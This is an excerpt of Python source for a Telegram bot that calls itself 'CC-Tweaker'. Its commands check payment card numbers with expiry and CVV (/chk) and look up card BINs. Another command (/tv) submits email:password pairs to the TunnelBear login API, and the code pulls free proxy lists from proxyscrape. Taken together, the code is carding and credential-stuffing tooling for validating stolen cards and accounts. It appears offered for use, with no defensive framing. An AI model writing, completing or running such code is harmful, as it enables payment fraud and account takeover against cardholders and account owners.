...
r = requests.get(
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=20&country=all&ssl=all&anonymity=all&simplified=true"
).text
res = r.partition("\n")[0]
...
async def helpstr(message: types.Message):
    ...
    await message.reply(
        "Hello, I'm CC-Tweaker, Commands: <code>/chk cc/mm/yy/cvv</code>"
    )
...
async def tv(message: types.Message):
    ...
    password = splitter[1]
    if not ac:
        return await message.reply("<code>Send ac /tv email:pass.</code>")
    payload = {
        "username": email,
        "password": password,
    ...
    r = session.post(
        "https://prod-api-core.tunnelbear.com/core/web/api/login",
        data=payload,
        headers=headers,
    )
...
async def binio(message: types.Message):
    ...
    if len(BIN) < 6:
        return await message.reply("enter a valid bin")
    if not BIN:
        return await message.reply("Error: Type integer")
...
async def ch(message: types.Message):
    ...
    if not cc:
        return await message.reply("<code>Send Card /chk cc|mm|yy|cvv.</code>")
    BIN = cc[:6]
